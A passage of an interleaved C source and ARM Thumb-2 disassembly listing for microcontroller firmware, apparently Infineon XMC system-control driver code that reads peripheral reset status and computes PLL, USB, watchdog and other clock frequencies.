 800147c:	af00      	add	r7, sp, #0
 800147e:	6078      	str	r0, [r7, #4]
  uint32_t index = (uint32_t)((((uint32_t)peripheral) & 0xf0000000UL) >> 28UL);
 8001480:	687b      	ldr	r3, [r7, #4]
 8001482:	0f1b      	lsrs	r3, r3, #28
 8001484:	60fb      	str	r3, [r7, #12]
  uint32_t mask = (((uint32_t)peripheral) & ((uint32_t)~0xf0000000UL));
 8001486:	687b      	ldr	r3, [r7, #4]
 8001488:	f023 4370 	bic.w	r3, r3, #4026531840	; 0xf0000000
 800148c:	60bb      	str	r3, [r7, #8]

  *(uint32_t *)(&(SCU_RESET->PRCLR0) + (index * 3U)) = (uint32_t)mask;
 800148e:	68fa      	ldr	r2, [r7, #12]
 8001490:	4613      	mov	r3, r2
 8001492:	005b      	lsls	r3, r3, #1
 8001494:	4413      	add	r3, r2
 8001496:	009b      	lsls	r3, r3, #2
 8001498:	461a      	mov	r2, r3
 800149a:	4b05      	ldr	r3, [pc, #20]	; (80014b0 <XMC_SCU_RESET_DeassertPeripheralReset+0x38>)
 800149c:	4413      	add	r3, r2
 800149e:	68ba      	ldr	r2, [r7, #8]
 80014a0:	601a      	str	r2, [r3, #0]
}
 80014a2:	bf00      	nop
 80014a4:	3714      	adds	r7, #20
 80014a6:	46bd      	mov	sp, r7
 80014a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014ac:	4770      	bx	lr
 80014ae:	bf00      	nop
 80014b0:	50004414 	.word	0x50004414

080014b4 <XMC_SCU_RESET_IsPeripheralResetAsserted>:

/* Find out if the peripheral reset is asserted */
bool XMC_SCU_RESET_IsPeripheralResetAsserted(const XMC_SCU_PERIPHERAL_RESET_t peripheral)
{
 80014b4:	b480      	push	{r7}
 80014b6:	b085      	sub	sp, #20
 80014b8:	af00      	add	r7, sp, #0
 80014ba:	6078      	str	r0, [r7, #4]
  uint32_t index = (uint32_t)((((uint32_t)peripheral) & 0xf0000000UL) >> 28UL);
 80014bc:	687b      	ldr	r3, [r7, #4]
 80014be:	0f1b      	lsrs	r3, r3, #28
 80014c0:	60fb      	str	r3, [r7, #12]
  uint32_t mask = (((uint32_t)peripheral) & ((uint32_t)~0xf0000000UL));
 80014c2:	687b      	ldr	r3, [r7, #4]
 80014c4:	f023 4370 	bic.w	r3, r3, #4026531840	; 0xf0000000
 80014c8:	60bb      	str	r3, [r7, #8]

  return ((*(uint32_t *)(&(SCU_RESET->PRSTAT0) + (index * 3U)) & mask) != 0U);
 80014ca:	68fa      	ldr	r2, [r7, #12]
 80014cc:	4613      	mov	r3, r2
 80014ce:	005b      	lsls	r3, r3, #1
 80014d0:	4413      	add	r3, r2
 80014d2:	009b      	lsls	r3, r3, #2
 80014d4:	461a      	mov	r2, r3
 80014d6:	4b08      	ldr	r3, [pc, #32]	; (80014f8 <XMC_SCU_RESET_IsPeripheralResetAsserted+0x44>)
 80014d8:	4413      	add	r3, r2
 80014da:	681a      	ldr	r2, [r3, #0]
 80014dc:	68bb      	ldr	r3, [r7, #8]
 80014de:	4013      	ands	r3, r2
 80014e0:	2b00      	cmp	r3, #0
 80014e2:	bf14      	ite	ne
 80014e4:	2301      	movne	r3, #1
 80014e6:	2300      	moveq	r3, #0
 80014e8:	b2db      	uxtb	r3, r3
}
 80014ea:	4618      	mov	r0, r3
 80014ec:	3714      	adds	r7, #20
 80014ee:	46bd      	mov	sp, r7
 80014f0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014f4:	4770      	bx	lr
 80014f6:	bf00      	nop
 80014f8:	5000440c 	.word	0x5000440c

080014fc <XMC_SCU_CLOCK_GetSystemPllClockFrequency>:

/*
 * API to retrieve frequency of System PLL output clock
 */
uint32_t XMC_SCU_CLOCK_GetSystemPllClockFrequency(void)
{
 80014fc:	b580      	push	{r7, lr}
 80014fe:	b084      	sub	sp, #16
 8001500:	af00      	add	r7, sp, #0
  uint32_t clock_frequency;
  uint32_t p_div;
  uint32_t n_div;
  uint32_t k2_div;

  clock_frequency = XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency();
 8001502:	f000 f839 	bl	8001578 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency>
 8001506:	60f8      	str	r0, [r7, #12]
  if(SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOBYST_Msk)
 8001508:	4b1a      	ldr	r3, [pc, #104]	; (8001574 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x78>)
 800150a:	681b      	ldr	r3, [r3, #0]
 800150c:	f003 0301 	and.w	r3, r3, #1
 8001510:	2b00      	cmp	r3, #0
 8001512:	d009      	beq.n	8001528 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x2c>
  {
    /* Prescalar mode - fOSC is the parent*/
    clock_frequency = (uint32_t)(clock_frequency / 
                      ((((SCU_PLL->PLLCON1) & SCU_PLL_PLLCON1_K1DIV_Msk) >> SCU_PLL_PLLCON1_K1DIV_Pos) + 1UL));
 8001514:	4b17      	ldr	r3, [pc, #92]	; (8001574 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x78>)
 8001516:	689b      	ldr	r3, [r3, #8]
 8001518:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800151c:	3301      	adds	r3, #1
    clock_frequency = (uint32_t)(clock_frequency / 
 800151e:	68fa      	ldr	r2, [r7, #12]
 8001520:	fbb2 f3f3 	udiv	r3, r2, r3
 8001524:	60fb      	str	r3, [r7, #12]
 8001526:	e01f      	b.n	8001568 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x6c>
  }
  else
  {
    p_div  = (uint32_t)((((SCU_PLL->PLLCON1) & SCU_PLL_PLLCON1_PDIV_Msk) >> SCU_PLL_PLLCON1_PDIV_Pos) + 1UL);
 8001528:	4b12      	ldr	r3, [pc, #72]	; (8001574 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x78>)
 800152a:	689b      	ldr	r3, [r3, #8]
 800152c:	0e1b      	lsrs	r3, r3, #24
 800152e:	f003 030f 	and.w	r3, r3, #15
 8001532:	3301      	adds	r3, #1
 8001534:	60bb      	str	r3, [r7, #8]
    n_div  = (uint32_t)((((SCU_PLL->PLLCON1) & SCU_PLL_PLLCON1_NDIV_Msk) >> SCU_PLL_PLLCON1_NDIV_Pos) + 1UL);
 8001536:	4b0f      	ldr	r3, [pc, #60]	; (8001574 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x78>)
 8001538:	689b      	ldr	r3, [r3, #8]
 800153a:	0a1b      	lsrs	r3, r3, #8
 800153c:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8001540:	3301      	adds	r3, #1
 8001542:	607b      	str	r3, [r7, #4]
    k2_div = (uint32_t)((((SCU_PLL->PLLCON1) & SCU_PLL_PLLCON1_K2DIV_Msk) >> SCU_PLL_PLLCON1_K2DIV_Pos) + 1UL);
 8001544:	4b0b      	ldr	r3, [pc, #44]	; (8001574 <XMC_SCU_CLOCK_GetSystemPllClockFrequency+0x78>)
 8001546:	689b      	ldr	r3, [r3, #8]
 8001548:	0c1b      	lsrs	r3, r3, #16
 800154a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800154e:	3301      	adds	r3, #1
 8001550:	603b      	str	r3, [r7, #0]
       
    clock_frequency = (clock_frequency * n_div) / (p_div * k2_div);
 8001552:	68fb      	ldr	r3, [r7, #12]
 8001554:	687a      	ldr	r2, [r7, #4]
 8001556:	fb03 f202 	mul.w	r2, r3, r2
 800155a:	68bb      	ldr	r3, [r7, #8]
 800155c:	6839      	ldr	r1, [r7, #0]
 800155e:	fb01 f303 	mul.w	r3, r1, r3
 8001562:	fbb2 f3f3 	udiv	r3, r2, r3
 8001566:	60fb      	str	r3, [r7, #12]
  }

  return (clock_frequency);
 8001568:	68fb      	ldr	r3, [r7, #12]
}
 800156a:	4618      	mov	r0, r3
 800156c:	3710      	adds	r7, #16
 800156e:	46bd      	mov	sp, r7
 8001570:	bd80      	pop	{r7, pc}
 8001572:	bf00      	nop
 8001574:	50004710 	.word	0x50004710

08001578 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency>:

/**
 * API to retrieve frequency of System PLL VCO input clock
 */
uint32_t XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency(void)
{
 8001578:	b580      	push	{r7, lr}
 800157a:	b082      	sub	sp, #8
 800157c:	af00      	add	r7, sp, #0
  uint32_t clock_frequency;

  /* Prescalar mode - fOSC is the parent*/
  if((SCU_PLL->PLLCON2 & SCU_PLL_PLLCON2_PINSEL_Msk) == (uint32_t)XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP)
 800157e:	4b08      	ldr	r3, [pc, #32]	; (80015a0 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency+0x28>)
 8001580:	68db      	ldr	r3, [r3, #12]
 8001582:	f003 0301 	and.w	r3, r3, #1
 8001586:	2b00      	cmp	r3, #0
 8001588:	d103      	bne.n	8001592 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency+0x1a>
  {
    clock_frequency = OSCHP_GetFrequency();
 800158a:	f005 f82d 	bl	80065e8 <OSCHP_GetFrequency>
 800158e:	6078      	str	r0, [r7, #4]
 8001590:	e001      	b.n	8001596 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency+0x1e>
  }
  else
  {
    clock_frequency = OFI_FREQUENCY;
 8001592:	4b04      	ldr	r3, [pc, #16]	; (80015a4 <XMC_SCU_CLOCK_GetSystemPllClockSourceFrequency+0x2c>)
 8001594:	607b      	str	r3, [r7, #4]
  }
  
  return (clock_frequency);
 8001596:	687b      	ldr	r3, [r7, #4]
}
 8001598:	4618      	mov	r0, r3
 800159a:	3708      	adds	r7, #8
 800159c:	46bd      	mov	sp, r7
 800159e:	bd80      	pop	{r7, pc}
 80015a0:	50004710 	.word	0x50004710
 80015a4:	016e3600 	.word	0x016e3600

080015a8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency>:

/*
 * API to retrieve frequency of USB PLL output clock
 */
uint32_t XMC_SCU_CLOCK_GetUsbPllClockFrequency(void)
{
 80015a8:	b580      	push	{r7, lr}
 80015aa:	b084      	sub	sp, #16
 80015ac:	af00      	add	r7, sp, #0
  uint32_t clock_frequency;
  uint32_t n_div;
  uint32_t p_div;
  
  clock_frequency = OSCHP_GetFrequency();
 80015ae:	f005 f81b 	bl	80065e8 <OSCHP_GetFrequency>
 80015b2:	60f8      	str	r0, [r7, #12]
  if((SCU_PLL->USBPLLSTAT & SCU_PLL_USBPLLSTAT_VCOBYST_Msk) == 0U)
 80015b4:	4b10      	ldr	r3, [pc, #64]	; (80015f8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency+0x50>)
 80015b6:	691b      	ldr	r3, [r3, #16]
 80015b8:	f003 0301 	and.w	r3, r3, #1
 80015bc:	2b00      	cmp	r3, #0
 80015be:	d116      	bne.n	80015ee <XMC_SCU_CLOCK_GetUsbPllClockFrequency+0x46>
  {
    /* Normal mode - fVCO is the parent*/
    n_div = (uint32_t)((((SCU_PLL->USBPLLCON) & SCU_PLL_USBPLLCON_NDIV_Msk) >> SCU_PLL_USBPLLCON_NDIV_Pos) + 1UL);
 80015c0:	4b0d      	ldr	r3, [pc, #52]	; (80015f8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency+0x50>)
 80015c2:	695b      	ldr	r3, [r3, #20]
 80015c4:	0a1b      	lsrs	r3, r3, #8
 80015c6:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 80015ca:	3301      	adds	r3, #1
 80015cc:	60bb      	str	r3, [r7, #8]
    p_div = (uint32_t)((((SCU_PLL->USBPLLCON) & SCU_PLL_USBPLLCON_PDIV_Msk) >> SCU_PLL_USBPLLCON_PDIV_Pos) + 1UL);
 80015ce:	4b0a      	ldr	r3, [pc, #40]	; (80015f8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency+0x50>)
 80015d0:	695b      	ldr	r3, [r3, #20]
 80015d2:	0e1b      	lsrs	r3, r3, #24
 80015d4:	f003 030f 	and.w	r3, r3, #15
 80015d8:	3301      	adds	r3, #1
 80015da:	607b      	str	r3, [r7, #4]
    clock_frequency = (uint32_t)((clock_frequency * n_div)/ (uint32_t)(p_div * 2UL));
 80015dc:	68fb      	ldr	r3, [r7, #12]
 80015de:	68ba      	ldr	r2, [r7, #8]
 80015e0:	fb03 f202 	mul.w	r2, r3, r2
 80015e4:	687b      	ldr	r3, [r7, #4]
 80015e6:	005b      	lsls	r3, r3, #1
 80015e8:	fbb2 f3f3 	udiv	r3, r2, r3
 80015ec:	60fb      	str	r3, [r7, #12]
  }
  return (clock_frequency);
 80015ee:	68fb      	ldr	r3, [r7, #12]
}
 80015f0:	4618      	mov	r0, r3
 80015f2:	3710      	adds	r7, #16
 80015f4:	46bd      	mov	sp, r7
 80015f6:	bd80      	pop	{r7, pc}
 80015f8:	50004710 	.word	0x50004710

080015fc <XMC_SCU_CLOCK_GetCcuClockFrequency>:

/*
 * API to retrieve frequency of CCU clock frequency
 */
uint32_t XMC_SCU_CLOCK_GetCcuClockFrequency(void)
{
 80015fc:	b580      	push	{r7, lr}
 80015fe:	b082      	sub	sp, #8
 8001600:	af00      	add	r7, sp, #0
  uint32_t frequency = 0UL;
 8001602:	2300      	movs	r3, #0
 8001604:	607b      	str	r3, [r7, #4]
  frequency = XMC_SCU_CLOCK_GetSystemClockFrequency();
 8001606:	f7ff fb9b 	bl	8000d40 <XMC_SCU_CLOCK_GetSystemClockFrequency>
 800160a:	6078      	str	r0, [r7, #4]
  
  return (uint32_t)(frequency >> ((uint32_t)((SCU_CLK->CCUCLKCR & SCU_CLK_CCUCLKCR_CCUDIV_Msk) >>
 800160c:	4b05      	ldr	r3, [pc, #20]	; (8001624 <XMC_SCU_CLOCK_GetCcuClockFrequency+0x28>)
 800160e:	6a1b      	ldr	r3, [r3, #32]
 8001610:	f003 0301 	and.w	r3, r3, #1
 8001614:	687a      	ldr	r2, [r7, #4]
 8001616:	fa22 f303 	lsr.w	r3, r2, r3
                                              SCU_CLK_CCUCLKCR_CCUDIV_Pos)));
}
 800161a:	4618      	mov	r0, r3
 800161c:	3708      	adds	r7, #8
 800161e:	46bd      	mov	sp, r7
 8001620:	bd80      	pop	{r7, pc}
 8001622:	bf00      	nop
 8001624:	50004600 	.word	0x50004600

08001628 <XMC_SCU_CLOCK_GetUsbClockFrequency>:

/*
 * API to retrieve USB and SDMMC clock frequency
 */
uint32_t XMC_SCU_CLOCK_GetUsbClockFrequency(void)
{
 8001628:	b580      	push	{r7, lr}
 800162a:	b082      	sub	sp, #8
 800162c:	af00      	add	r7, sp, #0
  uint32_t frequency = 0UL;
 800162e:	2300      	movs	r3, #0
 8001630:	607b      	str	r3, [r7, #4]
  XMC_SCU_CLOCK_USBCLKSRC_t clksrc;

  clksrc = XMC_SCU_CLOCK_GetUsbClockSource();
 8001632:	f7ff fb59 	bl	8000ce8 <XMC_SCU_CLOCK_GetUsbClockSource>
 8001636:	6038      	str	r0, [r7, #0]

  if (clksrc == XMC_SCU_CLOCK_USBCLKSRC_SYSPLL)
 8001638:	683b      	ldr	r3, [r7, #0]
 800163a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 800163e:	d103      	bne.n	8001648 <XMC_SCU_CLOCK_GetUsbClockFrequency+0x20>
  {
    frequency = XMC_SCU_CLOCK_GetSystemPllClockFrequency();
 8001640:	f7ff ff5c 	bl	80014fc <XMC_SCU_CLOCK_GetSystemPllClockFrequency>
 8001644:	6078      	str	r0, [r7, #4]
 8001646:	e005      	b.n	8001654 <XMC_SCU_CLOCK_GetUsbClockFrequency+0x2c>
  }
  else if (clksrc == XMC_SCU_CLOCK_USBCLKSRC_USBPLL)
 8001648:	683b      	ldr	r3, [r7, #0]
 800164a:	2b00      	cmp	r3, #0
 800164c:	d102      	bne.n	8001654 <XMC_SCU_CLOCK_GetUsbClockFrequency+0x2c>
  {
    frequency = XMC_SCU_CLOCK_GetUsbPllClockFrequency();
 800164e:	f7ff ffab 	bl	80015a8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency>
 8001652:	6078      	str	r0, [r7, #4]
  }
  else
  {
  }

  return (uint32_t)(frequency / (((SCU_CLK->USBCLKCR & SCU_CLK_USBCLKCR_USBDIV_Msk) >>
 8001654:	4b05      	ldr	r3, [pc, #20]	; (800166c <XMC_SCU_CLOCK_GetUsbClockFrequency+0x44>)
 8001656:	699b      	ldr	r3, [r3, #24]
 8001658:	f003 0307 	and.w	r3, r3, #7
                                   SCU_CLK_USBCLKCR_USBDIV_Pos) + 1UL));
 800165c:	3301      	adds	r3, #1
  return (uint32_t)(frequency / (((SCU_CLK->USBCLKCR & SCU_CLK_USBCLKCR_USBDIV_Msk) >>
 800165e:	687a      	ldr	r2, [r7, #4]
 8001660:	fbb2 f3f3 	udiv	r3, r2, r3
}
 8001664:	4618      	mov	r0, r3
 8001666:	3708      	adds	r7, #8
 8001668:	46bd      	mov	sp, r7
 800166a:	bd80      	pop	{r7, pc}
 800166c:	50004600 	.word	0x50004600

08001670 <XMC_SCU_CLOCK_GetEbuClockFrequency>:
#if defined(EBU)
/*
 * API to retrieve EBU clock frequency
 */
uint32_t XMC_SCU_CLOCK_GetEbuClockFrequency(void)
{
 8001670:	b580      	push	{r7, lr}
 8001672:	b082      	sub	sp, #8
 8001674:	af00      	add	r7, sp, #0
  uint32_t frequency = XMC_SCU_CLOCK_GetSystemPllClockFrequency();
 8001676:	f7ff ff41 	bl	80014fc <XMC_SCU_CLOCK_GetSystemPllClockFrequency>
 800167a:	6078      	str	r0, [r7, #4]
  
  return (uint32_t)((frequency /(((SCU_CLK->EBUCLKCR & SCU_CLK_EBUCLKCR_EBUDIV_Msk) >>
 800167c:	4b05      	ldr	r3, [pc, #20]	; (8001694 <XMC_SCU_CLOCK_GetEbuClockFrequency+0x24>)
 800167e:	69db      	ldr	r3, [r3, #28]
 8001680:	f003 033f 	and.w	r3, r3, #63	; 0x3f
                                   SCU_CLK_EBUCLKCR_EBUDIV_Pos) + 1UL)));
 8001684:	3301      	adds	r3, #1
  return (uint32_t)((frequency /(((SCU_CLK->EBUCLKCR & SCU_CLK_EBUCLKCR_EBUDIV_Msk) >>
 8001686:	687a      	ldr	r2, [r7, #4]
 8001688:	fbb2 f3f3 	udiv	r3, r2, r3
}
 800168c:	4618      	mov	r0, r3
 800168e:	3708      	adds	r7, #8
 8001690:	46bd      	mov	sp, r7
 8001692:	bd80      	pop	{r7, pc}
 8001694:	50004600 	.word	0x50004600

08001698 <XMC_SCU_CLOCK_GetWdtClockFrequency>:

/*
 * API to retrieve WDT clock frequency
 */
uint32_t XMC_SCU_CLOCK_GetWdtClockFrequency(void)
{
 8001698:	b580      	push	{r7, lr}
 800169a:	b082      	sub	sp, #8
 800169c:	af00      	add	r7, sp, #0
  uint32_t frequency = 0UL;
 800169e:	2300      	movs	r3, #0
 80016a0:	607b      	str	r3, [r7, #4]
  XMC_SCU_CLOCK_WDTCLKSRC_t clksrc;

  clksrc = XMC_SCU_CLOCK_GetWdtClockSource();
 80016a2:	f7ff fb2f 	bl	8000d04 <XMC_SCU_CLOCK_GetWdtClockSource>
 80016a6:	6038      	str	r0, [r7, #0]

  if (clksrc == XMC_SCU_CLOCK_WDTCLKSRC_PLL)
 80016a8:	683b      	ldr	r3, [r7, #0]
 80016aa:	f5b3 3f00 	cmp.w	r3, #131072	; 0x20000
 80016ae:	d103      	bne.n	80016b8 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x20>
  {
    frequency = XMC_SCU_CLOCK_GetSystemPllClockFrequency();
 80016b0:	f7ff ff24 	bl	80014fc <XMC_SCU_CLOCK_GetSystemPllClockFrequency>
 80016b4:	6078      	str	r0, [r7, #4]
 80016b6:	e00c      	b.n	80016d2 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x3a>
  }
  else if (clksrc == XMC_SCU_CLOCK_WDTCLKSRC_OFI)
 80016b8:	683b      	ldr	r3, [r7, #0]
 80016ba:	2b00      	cmp	r3, #0
 80016bc:	d102      	bne.n	80016c4 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x2c>
  {
    frequency = OFI_FREQUENCY;
 80016be:	4b0a      	ldr	r3, [pc, #40]	; (80016e8 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x50>)
 80016c0:	607b      	str	r3, [r7, #4]
 80016c2:	e006      	b.n	80016d2 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x3a>
  }
  else if (clksrc == XMC_SCU_CLOCK_WDTCLKSRC_STDBY)
 80016c4:	683b      	ldr	r3, [r7, #0]
 80016c6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80016ca:	d102      	bne.n	80016d2 <XMC_SCU_CLOCK_GetWdtClockFrequency+0x3a>
  {
    frequency = OSI_FREQUENCY;
 80016cc:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80016d0:	607b      	str	r3, [r7, #4]
  else
  {

  }

  return (uint32_t)((frequency / (((SCU_CLK->WDTCLKCR & SCU_CLK_WDTCLKCR_WDTDIV_Msk) >>
 80016d2:	4b06      	ldr	r3, [pc, #24]	; (80016ec <XMC_SCU_CLOCK_GetWdtClockFrequency+0x54>)
 80016d4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80016d6:	b2db      	uxtb	r3, r3
                                    SCU_CLK_WDTCLKCR_WDTDIV_Pos) + 1UL)));
 80016d8:	3301      	adds	r3, #1
  return (uint32_t)((frequency / (((SCU_CLK->WDTCLKCR & SCU_CLK_WDTCLKCR_WDTDIV_Msk) >>
 80016da:	687a      	ldr	r2, [r7, #4]
 80016dc:	fbb2 f3f3 	udiv	r3, r2, r3
}
 80016e0:	4618      	mov	r0, r3
 80016e2:	3708      	adds	r7, #8
 80016e4:	46bd      	mov	sp, r7
 80016e6:	bd80      	pop	{r7, pc}
 80016e8:	016e3600 	.word	0x016e3600
 80016ec:	50004600 	.word	0x50004600

080016f0 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency>:
/**
 * @brief API to retrieve EXTERNAL-OUT clock frequency
 * @retval Clock frequency
 */
uint32_t XMC_SCU_CLOCK_GetExternalOutputClockFrequency(void)
{
 80016f0:	b580      	push	{r7, lr}
 80016f2:	b082      	sub	sp, #8
 80016f4:	af00      	add	r7, sp, #0
  uint32_t frequency = 0UL;
 80016f6:	2300      	movs	r3, #0
 80016f8:	607b      	str	r3, [r7, #4]
  XMC_SCU_CLOCK_EXTOUTCLKSRC_t clksrc;

  clksrc = XMC_SCU_CLOCK_GetExternalOutputClockSource();
 80016fa:	f7ff fb11 	bl	8000d20 <XMC_SCU_CLOCK_GetExternalOutputClockSource>
 80016fe:	4603      	mov	r3, r0
 8001700:	70fb      	strb	r3, [r7, #3]

  if (clksrc == XMC_SCU_CLOCK_EXTOUTCLKSRC_PLL)
 8001702:	78fb      	ldrb	r3, [r7, #3]
 8001704:	2b03      	cmp	r3, #3
 8001706:	d10d      	bne.n	8001724 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x34>
  {
    frequency = XMC_SCU_CLOCK_GetSystemPllClockFrequency();
 8001708:	f7ff fef8 	bl	80014fc <XMC_SCU_CLOCK_GetSystemPllClockFrequency>
 800170c:	6078      	str	r0, [r7, #4]
    
    frequency = (uint32_t)((frequency / ((((SCU_CLK->EXTCLKCR) & SCU_CLK_EXTCLKCR_ECKDIV_Msk) >>
 800170e:	4b13      	ldr	r3, [pc, #76]	; (800175c <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x6c>)
 8001710:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8001712:	0c1b      	lsrs	r3, r3, #16
 8001714:	f3c3 0308 	ubfx	r3, r3, #0, #9
                 SCU_CLK_EXTCLKCR_ECKDIV_Pos)+ 1UL)));
 8001718:	3301      	adds	r3, #1
    frequency = (uint32_t)((frequency / ((((SCU_CLK->EXTCLKCR) & SCU_CLK_EXTCLKCR_ECKDIV_Msk) >>
 800171a:	687a      	ldr	r2, [r7, #4]
 800171c:	fbb2 f3f3 	udiv	r3, r2, r3
 8001720:	607b      	str	r3, [r7, #4]
 8001722:	e016      	b.n	8001752 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x62>
  }
  else if (clksrc == XMC_SCU_CLOCK_EXTOUTCLKSRC_SYS)
 8001724:	78fb      	ldrb	r3, [r7, #3]
 8001726:	2b00      	cmp	r3, #0
 8001728:	d103      	bne.n	8001732 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x42>
  {
    frequency = XMC_SCU_CLOCK_GetSystemClockFrequency();
 800172a:	f7ff fb09 	bl	8000d40 <XMC_SCU_CLOCK_GetSystemClockFrequency>
 800172e:	6078      	str	r0, [r7, #4]
 8001730:	e00f      	b.n	8001752 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x62>
  }
  else if (clksrc == XMC_SCU_CLOCK_EXTOUTCLKSRC_USB)
 8001732:	78fb      	ldrb	r3, [r7, #3]
 8001734:	2b02      	cmp	r3, #2
 8001736:	d10c      	bne.n	8001752 <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x62>
  {
    frequency = XMC_SCU_CLOCK_GetUsbPllClockFrequency();
 8001738:	f7ff ff36 	bl	80015a8 <XMC_SCU_CLOCK_GetUsbPllClockFrequency>
 800173c:	6078      	str	r0, [r7, #4]
    
    frequency = (uint32_t)((frequency / ((((SCU_CLK->EXTCLKCR) & SCU_CLK_EXTCLKCR_ECKDIV_Msk) >>
 800173e:	4b07      	ldr	r3, [pc, #28]	; (800175c <XMC_SCU_CLOCK_GetExternalOutputClockFrequency+0x6c>)
 8001740:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8001742:	0c1b      	lsrs	r3, r3, #16
 8001744:	f3c3 0308 	ubfx	r3, r3, #0, #9
                 SCU_CLK_EXTCLKCR_ECKDIV_Pos)+ 1UL)));
 8001748:	3301      	adds	r3, #1
    frequency = (uint32_t)((frequency / ((((SCU_CLK->EXTCLKCR) & SCU_CLK_EXTCLKCR_ECKDIV_Msk) >>
 800174a:	687a      	ldr	r2, [r7, #4]
 800174c:	fbb2 f3f3 	udiv	r3, r2, r3
 8001750:	607b      	str	r3, [r7, #4]
  else
  {

  }

  return (frequency);
 8001752:	687b      	ldr	r3, [r7, #4]
}
 8001754:	4618      	mov	r0, r3
 8001756:	3708      	adds	r7, #8
 8001758:	46bd      	mov	sp, r7
 800175a:	bd80      	pop	{r7, pc}
 800175c:	50004600 	.word	0x50004600

08001760 <XMC_SCU_CLOCK_GetPeripheralClockFrequency>:

/*
 * API to retrieve clock frequency of peripherals on the peripheral bus using a shared functional clock
 */
uint32_t XMC_SCU_CLOCK_GetPeripheralClockFrequency(void)
{
 8001760:	b580      	push	{r7, lr}
 8001762:	af00      	add	r7, sp, #0
  return (uint32_t)(XMC_SCU_CLOCK_GetCpuClockFrequency() >>
 8001764:	f7ff fb00 	bl	8000d68 <XMC_SCU_CLOCK_GetCpuClockFrequency>
 8001768:	4602      	mov	r2, r0
         ((SCU_CLK->PBCLKCR & SCU_CLK_PBCLKCR_PBDIV_Msk) >> SCU_CLK_PBCLKCR_PBDIV_Pos));  
 800176a:	4b04      	ldr	r3, [pc, #16]	; (800177c <XMC_SCU_CLOCK_GetPeripheralClockFrequency+0x1c>)
 800176c:	695b      	ldr	r3, [r3, #20]
 800176e:	f003 0301 	and.w	r3, r3, #1
  return (uint32_t)(XMC_SCU_CLOCK_GetCpuClockFrequency() >>
 8001772:	fa22 f303 	lsr.w	r3, r2, r3
}
 8001776:	4618      	mov	r0, r3
 8001778:	bd80      	pop	{r7, pc}
 800177a:	bf00      	nop
 800177c:	50004600 	.word	0x50004600

08001780 <XMC_SCU_CLOCK_SetSystemClockSource>:

/* API to select fSYS */
void XMC_SCU_CLOCK_SetSystemClockSource(const XMC_SCU_CLOCK_SYSCLKSRC_t source)
{
 8001780:	b480      	push	{r7}
 8001782:	b083      	sub	sp, #12
 8001784:	af00      	add	r7, sp, #0
 8001786:	6078      	str	r0, [r7, #4]
  SCU_CLK->SYSCLKCR = (SCU_CLK->SYSCLKCR & ((uint32_t)~SCU_CLK_SYSCLKCR_SYSSEL_Msk)) |
 8001788:	4b06      	ldr	r3, [pc, #24]	; (80017a4 <XMC_SCU_CLOCK_SetSystemClockSource+0x24>)
 800178a:	68db      	ldr	r3, [r3, #12]
 800178c:	f423 3280 	bic.w	r2, r3, #65536	; 0x10000
 8001790:	4904      	ldr	r1, [pc, #16]	; (80017a4 <XMC_SCU_CLOCK_SetSystemClockSource+0x24>)
 8001792:	687b      	ldr	r3, [r7, #4]
 8001794:	4313      	orrs	r3, r2
 8001796:	60cb      	str	r3, [r1, #12]
                      ((uint32_t)source);
}
 8001798:	bf00      	nop
 800179a:	370c      	adds	r7, #12
 800179c:	46bd      	mov	sp, r7
 800179e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017a2:	4770      	bx	lr
 80017a4:	50004600 	.word	0x50004600

080017a8 <XMC_SCU_CLOCK_SetUsbClockSource>:

/* API to select fUSB */
void XMC_SCU_CLOCK_SetUsbClockSource(const XMC_SCU_CLOCK_USBCLKSRC_t source)
{
 80017a8:	b480      	push	{r7}
 80017aa:	b083      	sub	sp, #12
 80017ac:	af00      	add	r7, sp, #0
 80017ae:	6078      	str	r0, [r7, #4]
  SCU_CLK->USBCLKCR = (SCU_CLK->USBCLKCR & ((uint32_t)~SCU_CLK_USBCLKCR_USBSEL_Msk)) |
 80017b0:	4b06      	ldr	r3, [pc, #24]	; (80017cc <XMC_SCU_CLOCK_SetUsbClockSource+0x24>)
 80017b2:	699b      	ldr	r3, [r3, #24]
 80017b4:	f423 3280 	bic.w	r2, r3, #65536	; 0x10000
